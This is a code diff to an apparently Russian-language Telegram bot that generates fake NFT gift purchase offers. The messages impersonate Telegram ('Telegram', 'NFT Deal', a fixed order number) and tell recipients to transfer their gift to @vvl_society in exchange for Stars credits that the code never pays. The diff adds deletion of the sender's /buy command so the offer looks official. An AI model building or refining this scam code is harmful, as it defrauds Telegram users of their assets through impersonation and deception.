@@ -22,7 +22,6 @@ def parse_nft_link(url):
     Из ссылки https://t.me/nft/ViceCream-302895
     достаёт: {"name": "Vice Cream", "number": "302895", "full": "Vice Cream #302895"}
     """
-    # Ищем паттерн: /nft/Название-Цифры
     match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
     if not match:
         return None
@@ -30,8 +29,7 @@ def parse_nft_link(url):
     raw_name = match.group(1)   # "ViceCream" или "SnoopDogg"
     number = match.group(2)     # "302895" или "9203"
     
-    # Разбиваем CamelCase на слова: "ViceCream" -> "Vice Cream", "SnoopDogg" -> "Snoop Dogg"
-    # Вставляем пробел перед каждой заглавной буквой (кроме первой)
+    # Разбиваем CamelCase: "ViceCream" -> "Vice Cream", "SnoopDogg" -> "Snoop Dogg"
     name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
     
     return {
@@ -45,6 +43,12 @@ def parse_nft_link(url):
 # --- Команда /buy ---
 @dp.message(Command("buy"))
 async def cmd_buy(message: types.Message):
+    # Сразу удаляем сообщение пользователя с командой /buy
+    try:
+        await message.delete()
+    except Exception as e:
+        logging.warning(f"Не удалось удалить сообщение: {e}")
+
     args = message.text.split()
     
     if len(args) < 4:
@@ -69,9 +73,10 @@ async def cmd_buy(message: types.Message):
         )
         return
 
+    # ✅ ВЕЗДЕ используем отформатированное название (с пробелом)
     nft_title = nft_data["full"]  # "Vice Cream #302895"
 
-    # Формируем текст предложения (как на скрине 1)
+    # Формируем текст предложения
     text = (
         f"<b>Telegram\n"
         f"{nft_title}</b>\n\n"
@@ -80,7 +85,7 @@ async def cmd_buy(message: types.Message):
         f"Оффер действителен ещё 6 ч. 0 мин."
     )
 
-    # Кнопки Отклонить и Принять
+    # Кнопки
     builder = InlineKeyboardBuilder()
     builder.row(
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
@@ -93,28 +98,25 @@ async def cmd_buy(message: types.Message):
         "link": nft_link,
         "amount": amount,
         "currency": currency,
-        "title": nft_title
+        "title": nft_title  # ✅ уже отформатированное
     }
 
-    # Отправляем карточку (текстом). 
-    # Опционально: можно прикрепить "заглушку"-картинку слева от текста,
-    # но раз парсинг картинки не работает, оставляем чистый текст.
     await message.answer(
         text=text,
         reply_markup=builder.as_markup(),
         parse_mode="HTML",
-        disable_web_page_preview=False  # Telegram сам подтянет превью, если сможет
+        disable_web_page_preview=False
     )
 
 
-# --- Обработка "Отклонить" ---
+# --- Отклонить ---
 @dp.callback_query(F.data.startswith("decline_"))
 async def process_decline(callback: CallbackQuery):
     await callback.message.edit_text("❌ Предложение отклонено")
     await callback.answer()
 
 
-# --- Обработка "Принять" ---
+# --- Принять ---
 @dp.callback_query(F.data.startswith("accept_"))
 async def process_accept(callback: CallbackQuery):
     await callback.answer(
@@ -129,7 +131,10 @@ async def process_accept(callback: CallbackQuery):
         await callback.message.edit_text("⚠️ Ошибка: данные о сделке утеряны.")
         return
 
-    # Формируем финальный текст (как на скрине 3)
+    # ✅ Здесь тоже используем deal['title'] — уже "Vice Cream #302895"
+    nft_title = deal["title"]
+
+    # Формируем финальный текст
     final_text = (
         f"<b>NFT Deal</b>\n\n"
         f"Ордер #TG-D721BSTP\n\n"
@@ -139,7 +144,7 @@ async def process_accept(callback: CallbackQuery):
         f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
         f"<b>Инструкция для завершения сделки:</b>\n"
         f"1. Передайте подарок пользователю: @vvl_society\n"
-        f"2. Нажмите «Передать NFT» и выберите {deal['title']}\n"
+        f"2. Нажмите «Передать NFT» и выберите <b>{nft_title}</b>\n"
         f"3. Подтвердите передачу подарка.\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
         f"{deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
@@ -161,7 +166,7 @@ async def process_accept(callback: CallbackQuery):
     )
 
 
-# --- Подтверждение передачи ---
+# --- Подтвердить передачу ---
 @dp.callback_query(F.data.startswith("confirm_"))
 async def process_confirm(callback: CallbackQuery):
     await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
